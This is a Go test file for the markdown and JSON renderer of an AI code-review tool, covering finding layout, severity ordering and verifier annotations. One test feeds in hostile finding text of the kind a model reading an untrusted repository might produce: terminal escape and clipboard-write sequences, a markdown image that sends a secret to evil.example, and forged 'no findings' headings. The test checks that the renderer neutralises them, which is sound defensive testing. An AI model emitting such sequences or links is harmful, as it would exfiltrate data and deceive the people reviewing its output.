package render

import (
	"encoding/json"
	"strings"
	"testing"

	"github.com/bluesky-social/roast/internal/review"
)

// ---------------------------------------------------------------------------
// ToMarkdown — golden checks

// goodFinding is a fully populated finding for rendering tests.
var goodFinding = review.Finding{
	Reasoning:   "This is the reasoning",
	Severity:    review.SeverityHigh,
	Confidence:  0.9,
	Description: "Nil pointer dereference",
	File:        "main.go",
	Lines:       []int{10, 12},
	CodeQuote:   "x := foo()\nreturn x.Val",
	FixedCode:   "x := foo()\nif x == nil { return }\nreturn x.Val",
}

func TestToMarkdown_NoFindings(t *testing.T) {
	r := Report{
		Result: &review.Result{
			Findings:   []review.Finding{},
			Dropped:    []review.Finding{},
			Assessment: review.AssessmentNoFindings,
			Notes:      []string{},
		},
		Mode:          "code",
		FilesReviewed: []string{},
		Usage:         nil,
	}
	md := ToMarkdown(r, false)
	if !strings.Contains(md, "no findings") {
		t.Errorf("want 'no findings' in output, got:\n%s", md)
	}
}

func TestToMarkdown_NoDiffSaysNoReviewRan(t *testing.T) {
	r := Report{
		Result: &review.Result{
			Findings:   []review.Finding{},
			Dropped:    []review.Finding{},
			Assessment: review.AssessmentNoDiff,
			Notes:      []string{},
		},
		Mode:          "code",
		FilesReviewed: []string{},
	}
	md := ToMarkdown(r, false)
	if !strings.Contains(md, "no review ran") || !strings.Contains(md, "NOT a clean review") {
		t.Fatalf("NO_DIFF must be unmistakable, got:\n%s", md)
	}
	if strings.Contains(md, "Roast complete") {
		t.Fatalf("NO_DIFF must not render as a completed review, got:\n%s", md)
	}
}

// TestToMarkdown_IncompleteNoSubmission verifies a budget-exhausted
// interactive run with zero findings renders as explicitly incomplete, not
// as a clean "no findings" review — the two must not read identically since
// one asserts coverage and the other admits none was achieved.
func TestToMarkdown_IncompleteNoSubmission(t *testing.T) {
	r := Report{
		Result: &review.Result{
			Findings:   []review.Finding{},
			Dropped:    []review.Finding{},
			Assessment: review.AssessmentIncompleteNoSubmission,
			Notes:      []string{},
		},
		Mode:          "code",
		FilesReviewed: []string{},
		Usage:         nil,
	}
	md := ToMarkdown(r, false)
	if !strings.Contains(md, "Roast incomplete") {
		t.Errorf("want 'Roast incomplete' in output, got:\n%s", md)
	}
	if !strings.Contains(md, "NOT a clean review") {
		t.Errorf("want explicit NOT-clean caveat in output, got:\n%s", md)
	}
	if strings.Contains(md, "Roast complete") {
		t.Errorf("incomplete run must not render as 'Roast complete', got:\n%s", md)
	}
}

// TestSurveyCoverageFields verifies survey coverage metadata surfaces in both
// JSON (top-level keys) and markdown (banner), and is absent for a normal
// diff review.
func TestSurveyCoverageFields(t *testing.T) {
	r := Report{
		Result: &review.Result{
			Findings:   []review.Finding{},
			Dropped:    []review.Finding{},
			Assessment: review.AssessmentNoFindingsInSampledAreas,
			Notes:      []string{},
		},
		Mode:              "code",
		FilesReviewed:     []string{"a.go", "b.go"},
		ReviewKind:        "survey_triage",
		Completion:        "complete",
		ManifestFileCount: 2,
		StopReason:        "converged",
	}

	var payload map[string]any
	if err := json.Unmarshal([]byte(ToJSON(r)), &payload); err != nil {
		t.Fatalf("ToJSON not valid JSON: %v", err)
	}
	if payload["review_kind"] != "survey_triage" {
		t.Errorf("want review_kind=survey_triage, got %v", payload["review_kind"])
	}
	if payload["completion"] != "complete" {
		t.Errorf("want completion=complete, got %v", payload["completion"])
	}
	if payload["stop_reason"] != "converged" {
		t.Errorf("want stop_reason=converged, got %v", payload["stop_reason"])
	}
	if payload["assessment"] != review.AssessmentNoFindingsInSampledAreas {
		t.Errorf("survey clean assessment must be NO_FINDINGS_IN_SAMPLED_AREAS, got %v", payload["assessment"])
	}

	md := ToMarkdown(r, false)
	if !strings.Contains(md, "Survey triage") {
		t.Errorf("markdown missing survey banner, got:\n%s", md)
	}
	if !strings.Contains(md, "manifest contains 2 files") {
		t.Errorf("markdown banner missing file count, got:\n%s", md)
	}

	// A normal diff report omits the coverage keys entirely.
	diff := Report{
		Result: &review.Result{Findings: []review.Finding{}, Dropped: []review.Finding{}, Assessment: review.AssessmentNoFindings, Notes: []string{}},
		Mode:   "code",
	}
	var dp map[string]any
	_ = json.Unmarshal([]byte(ToJSON(diff)), &dp)
	if _, ok := dp["review_kind"]; ok {
		t.Error("diff report must not carry review_kind")
	}
	if strings.Contains(ToMarkdown(diff, false), "Survey triage") {
		t.Error("diff markdown must not carry survey banner")
	}
}

func TestToMarkdown_FindingsHeader(t *testing.T) {
	r := Report{
		Result: &review.Result{
			Findings:   []review.Finding{goodFinding},
			Dropped:    []review.Finding{},
			Assessment: review.AssessmentFindings,
			Notes:      []string{},
		},
		Mode:     "code",
		Verified: true,
		Usage:    nil,
	}
	md := ToMarkdown(r, false)
	if !strings.Contains(md, "1 finding(s)") {
		t.Errorf("want count in header, got:\n%s", md)
	}
	if !strings.Contains(md, "cross-model verified") {
		t.Errorf("want cross-model verified suffix, got:\n%s", md)
	}
}

func TestToMarkdown_FileAndLines(t *testing.T) {
	r := Report{
		Result: &review.Result{
			Findings:   []review.Finding{goodFinding},
			Dropped:    []review.Finding{},
			Assessment: review.AssessmentFindings,
			Notes:      []string{},
		},
		Verified: false,
		Usage:    nil,
	}
	md := ToMarkdown(r, false)
	if !strings.Contains(md, "main.go:10-12") {
		t.Errorf("want file:lines, got:\n%s", md)
	}
}

func TestToMarkdown_VerifierGrounding(t *testing.T) {
	f := goodFinding
	f.Verdict = &review.Verdict{
		Reasoning:  "it's fine",
		Status:     review.VerdictConfirmed,
		Confidence: 0.85,
		Grounding:  "line 10: x is checked before use",
		Verifier:   "claude-opus",
	}
	r := Report{
		Result: &review.Result{
			Findings:   []review.Finding{f},
			Dropped:    []review.Finding{},
			Assessment: review.AssessmentFindings,
			Notes:      []string{},
		},
		Verified: true,
		Usage:    nil,
	}
	md := ToMarkdown(r, false)
	if !strings.Contains(md, "claude-opus") {
		t.Errorf("want verifier name, got:\n%s", md)
	}
	if !strings.Contains(md, "line 10: x is checked before use") {
		t.Errorf("want grounding text, got:\n%s", md)
	}
}

func TestToMarkdown_RecalibratedSeverityShown(t *testing.T) {
	f := goodFinding // Severity: HIGH
	f.Verdict = &review.Verdict{
		Status:               review.VerdictConfirmed,
		Confidence:           0.85,
		Grounding:            "guard limits blast radius",
		RecalibratedSeverity: review.SeverityLow,
	}
	r := Report{
		Result: &review.Result{
			Findings:   []review.Finding{f},
			Dropped:    []review.Finding{},
			Assessment: review.AssessmentFindings,
			Notes:      []string{},
		},
		Verified: true,
		Usage:    nil,
	}
	md := ToMarkdown(r, false)
	if !strings.Contains(md, "LOW (finder claimed HIGH — verifier recalibrated)") {
		t.Errorf("want recalibrated severity annotation, got:\n%s", md)
	}
}

func TestToMarkdown_UnrecalibratedSeverityNotAnnotated(t *testing.T) {
	f := goodFinding // Severity: HIGH
	f.Verdict = &review.Verdict{
		Status:     review.VerdictConfirmed,
		Confidence: 0.85,
		Grounding:  "confirmed as described",
	}
	r := Report{
		Result: &review.Result{
			Findings:   []review.Finding{f},
			Dropped:    []review.Finding{},
			Assessment: review.AssessmentFindings,
			Notes:      []string{},
		},
		Verified: true,
		Usage:    nil,
	}
	md := ToMarkdown(r, false)
	if strings.Contains(md, "recalibrated") {
		t.Errorf("did not expect recalibration annotation when severity unchanged, got:\n%s", md)
	}
}

func TestToMarkdown_PriorSighting(t *testing.T) {
	fp := review.Fingerprint(goodFinding)
	r := Report{
		Result: &review.Result{
			Findings:   []review.Finding{goodFinding},
			Dropped:    []review.Finding{},
			Assessment: review.AssessmentFindings,
			Notes:      []string{},
		},
		Prior: map[string]string{fp: "seen in run 2026-07-01, confirmed"},
		Usage: nil,
	}
	md := ToMarkdown(r, false)
	if !strings.Contains(md, "Seen previously") {
		t.Errorf("want prior sighting annotation, got:\n%s", md)
	}
	if !strings.Contains(md, "2026-07-01") {
		t.Errorf("want prior sighting note text, got:\n%s", md)
	}
}

func TestToMarkdown_ShowDropped(t *testing.T) {
	dropped := goodFinding
	dropped.DropReason = review.DropMissingCodeQuote
	dropped.CodeQuote = ""
	r := Report{
		Result: &review.Result{
			Findings:   []review.Finding{},
			Dropped:    []review.Finding{dropped},
			Assessment: review.AssessmentNoFindings,
			Notes:      []string{},
		},
		Usage: nil,
	}
	md := ToMarkdown(r, true)
	if !strings.Contains(md, "Dropped findings") {
		t.Errorf("want dropped section when showDropped=true, got:\n%s", md)
	}
	if !strings.Contains(md, "missing_code_quote") {
		t.Errorf("want drop reason in output, got:\n%s", md)
	}
}

func TestToMarkdown_SortOrder(t *testing.T) {
	// CRITICAL finding should appear before INFO finding.
	low := goodFinding
	low.Severity = review.SeverityInfo
	low.Description = "low severity"

	high := goodFinding
	high.Severity = review.SeverityCritical
	high.Description = "critical severity"

	r := Report{
		Result: &review.Result{
			Findings:   []review.Finding{low, high},
			Dropped:    []review.Finding{},
			Assessment: review.AssessmentFindings,
			Notes:      []string{},
		},
		Usage: nil,
	}
	md := ToMarkdown(r, false)
	critIdx := strings.Index(md, "critical severity")
	lowIdx := strings.Index(md, "low severity")
	if critIdx == -1 || lowIdx == -1 {
		t.Fatal("both findings should appear in output")
	}
	if critIdx > lowIdx {
		t.Error("CRITICAL finding should appear before INFO finding")
	}
}

// ---------------------------------------------------------------------------
// ToJSON round-trip

func TestToJSON_RoundTrip(t *testing.T) {
	r := Report{
		Result: &review.Result{
			Findings:   []review.Finding{goodFinding},
			Dropped:    []review.Finding{},
			Assessment: review.AssessmentFindings,
			Notes:      []string{"note1"},
		},
		Mode:          "code",
		Quick:         false,
		Verified:      true,
		FilesReviewed: []string{"main.go"},
		Usage:         nil,
	}
	out := ToJSON(r)
	var m map[string]any
	if err := json.Unmarshal([]byte(out), &m); err != nil {
		t.Fatalf("ToJSON produced invalid JSON: %v\n%s", err, out)
	}
	if m["assessment"] != review.AssessmentFindings {
		t.Errorf("want assessment FINDINGS_PRESENT, got %v", m["assessment"])
	}
	findings, ok := m["findings"].([]any)
	if !ok || len(findings) != 1 {
		t.Errorf("want 1 finding in JSON, got %v", m["findings"])
	}
	// Fingerprint should be present.
	f0 := findings[0].(map[string]any)
	if f0["fingerprint"] == "" || f0["fingerprint"] == nil {
		t.Error("want non-empty fingerprint in JSON output")
	}
}

func TestToJSON_DiffTruncatedBlock(t *testing.T) {
	r := Report{
		Result: &review.Result{
			Findings:   []review.Finding{},
			Dropped:    []review.Finding{},
			Assessment: review.AssessmentNoFindings,
			Notes:      []string{},
		},
		DiffTruncated:     true,
		OriginalDiffBytes: 500000,
		SizeBreakdown:     []SizeEntry{{Path: "big.go", Bytes: 500000}},
		Usage:             nil,
	}
	out := ToJSON(r)
	var m map[string]any
	if err := json.Unmarshal([]byte(out), &m); err != nil {
		t.Fatalf("invalid JSON: %v", err)
	}
	if m["diff_truncated"] != true {
		t.Error("want diff_truncated=true in JSON")
	}
	if m["original_diff_bytes"] == nil {
		t.Error("want original_diff_bytes in JSON")
	}
}

// TestToMarkdown_NeutralizesHostileFindingText pins the terminal-safety
// contract: finding text arrives from a model that read an untrusted
// repository, and JSON escapes like \u001b decode to real control bytes.
// Markdown must print none of them raw, must not let a quoted ``` line close
// its fence, and must not let a single-line field start a forged heading.
func TestToMarkdown_NeutralizesHostileFindingText(t *testing.T) {
	hostile := review.Finding{
		Severity: review.SeverityHigh, Confidence: 0.9,
		Description: "SQL injection\x1b[2J\x1b]0;roast: clean\x07\n## Roast complete — no findings",
		File:        "a.go\x1b]8;;https://evil.example/\x07a.go\u009b",
		CWE:         "CWE-89\r",
		Reasoning:   "first line\x1b]52;c;ZWNobw==\x07\n## Roast: 0 finding(s)",
		CodeQuote:   "x := 1\n```\n![x](https://evil.example/leak?d=SECRET)\n````",
		FixedCode:   "y := 2",
		Verdict: &review.Verdict{
			Status: review.VerdictConfirmed, Confidence: 0.8,
			Grounding: "line 1\x9b\n# forged", Verifier: "model\x1b[31m",
		},
	}
	res := &review.Result{Assessment: review.AssessmentFindings, Findings: []review.Finding{hostile}}
	md := ToMarkdown(Report{Result: res, Verified: true}, false)

	for _, r := range md {
		if (r < 0x20 && r != '\n' && r != '\t') || (r >= 0x7f && r <= 0x9f) {
			t.Fatalf("markdown contains raw control %U:\n%q", r, md)
		}
	}
	if strings.Contains(md, "\xc2\x9b") || strings.Contains(md, "\x9b") {
		t.Fatalf("markdown contains a raw C1 CSI byte:\n%q", md)
	}
	if !strings.Contains(md, `\x1b[2J`) || !strings.Contains(md, `\u009b`) {
		t.Errorf("escapes must stay visible, got:\n%s", md)
	}
	for _, line := range strings.Split(md, "\n") {
		if strings.HasPrefix(line, "## Roast complete") || strings.HasPrefix(line, "## Roast: 0") || strings.HasPrefix(line, "# forged") {
			t.Errorf("finding text forged a top-level line: %q", line)
		}
	}
	// The quote holds runs of three and four backticks, so the fence must be
	// five long, and the image line must stay inside the block.
	if !strings.Contains(md, "  `````\n  x := 1\n  ```\n  ![x](https://evil.example/leak?d=SECRET)\n  ````\n  `````") {
		t.Errorf("code fence does not enclose the quoted backticks:\n%s", md)
	}

	js := ToJSON(Report{Result: res})
	if strings.Contains(js, "\x1b") {
		t.Error("JSON output must keep escaping control characters")
	}
	var decoded struct {
		Findings []review.Finding `json:"findings"`
	}
	if err := json.Unmarshal([]byte(js), &decoded); err != nil || decoded.Findings[0].Description != hostile.Description {
		t.Errorf("JSON must round-trip the raw text unchanged (err=%v)", err)
	}
}

func TestToMarkdown_PlainFindingUnchanged(t *testing.T) {
	res := &review.Result{Assessment: review.AssessmentFindings, Findings: []review.Finding{goodFinding}}
	md := ToMarkdown(Report{Result: res}, false)
	for _, want := range []string{
		"- **File:** `main.go:10-12`",
		"- **Reasoning:** This is the reasoning",
		"  ```\n  x := foo()\n  return x.Val\n  ```",
	} {
		if !strings.Contains(md, want) {
			t.Errorf("markdown missing %q:\n%s", want, md)
		}
	}
}
